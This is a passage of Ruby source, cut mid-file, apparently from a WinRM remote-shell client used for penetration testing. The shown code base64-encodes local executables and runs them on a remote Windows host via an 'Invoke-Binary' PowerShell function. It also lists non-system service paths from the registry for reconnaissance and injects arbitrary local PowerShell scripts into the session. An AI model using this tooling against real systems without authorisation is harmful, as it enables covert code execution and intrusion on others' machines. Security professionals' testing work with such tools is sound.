                    load_executable = Base64.strict_encode64(load_executable)

                    if !invoke_Binary[4].to_s.empty? && invoke_Binary[5].to_s.empty?
                        output = shell.run("Invoke-Binary " + load_executable + "," + invoke_Binary[2] + "," + invoke_Binary[3] + "," + invoke_Binary[4])
                    elsif !invoke_Binary[3].to_s.empty? && invoke_Binary[4].to_s.empty?
                        output = shell.run("Invoke-Binary " + load_executable + "," + invoke_Binary[2] + "," + invoke_Binary[3])
                    elsif !invoke_Binary[2].to_s.empty? && invoke_Binary[3].to_s.empty?
                        output = shell.run("Invoke-Binary " + load_executable + "," + invoke_Binary[2])
                    elsif invoke_Binary[2].to_s.empty?
                        output = shell.run("Invoke-Binary " + load_executable)
                    end
                    print(output.output)
                rescue
                    print_message("Check file names", TYPE_ERROR)
                end

            elsif command.start_with?('services') then
                command = ""
                output = shell.run('Get-ItemProperty "registry::HKLM\System\CurrentControlSet\Services\*" | Where-Object {$_.imagepath -notmatch "system" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath | fl')
                print(output.output.chomp)

            elsif command.start_with?(*functions) then
                silent_warnings do
                    load_script = $scripts_path + command
                    command = ""
                    load_script = load_script.gsub(" ","")
                    load_script = File.binread(load_script)
                    output = shell.run(load_script)
                end

            elsif command.start_with?('menu') then
                command = ""
                silent_warnings do
                    output = shell.run(menu)
                    output = shell.run("Menu")
                    autocomplete = shell.run("auto").output.chomp
                    autocomplete = autocomplete.gsub!(/\r\n?/, "\n")
                    LIST2 = autocomplete.split("\n")
                    LIST = LIST + LIST2
                    print(output.output)
                end
            end

            output = shell.run(command) do |stdout, stderr|
                STDOUT.print(stdout)
                STDERR.print(stderr)
            end
        end

        custom_exit(0)
    end
rescue
    print_message("Can't establish connection. Check connection params", TYPE_ERROR)
    custom_exit(1)
end
